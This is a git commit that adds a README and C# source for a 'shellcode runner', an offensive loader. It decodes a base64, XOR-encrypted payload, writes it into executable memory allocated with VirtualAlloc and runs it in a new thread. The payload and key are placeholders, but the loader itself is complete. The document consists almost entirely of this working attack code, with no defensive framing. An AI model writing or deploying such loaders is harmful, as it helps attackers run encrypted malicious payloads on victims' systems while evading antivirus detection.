3baa85d631faaad642f440b8ea73cd3590c415cd
sz7mon <93045187+sz7mon@users.noreply.github.com>
2024-02-21 14:14:11 +0100

    Add files via upload

---
+++ README.md
@@ -0,0 +1,2 @@
+## C# Shellcode Runner
+Simple shellcode runner. Shellcode must be xor encrypted and base64 encoded. You must provide a key to decrypt the shellcode.
---
+++ ShellcodeRunner/Program.cs
@@ -0,0 +1,42 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+internal class Program
+{
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    public static byte[] dec(byte[] data, string key)
+    {
+        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
+        byte[] result = new byte[data.Length];
+        for (int i = 0; i < data.Length; i++)
+        {
+            result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
+        }
+        return result;
+    }
+    static void Main(string[] args)
+    {
+
+        string encodedData;
+        encodedData = "<base64_payload>";
+        byte[] decodedData = Convert.FromBase64String(encodedData);
+        int size = decodedData.Length;
+        string k = "<key>";
+        byte[] decr_data = dec(decodedData, k);
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
+        Marshal.Copy(decr_data, 0, addr, size);
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }
+}
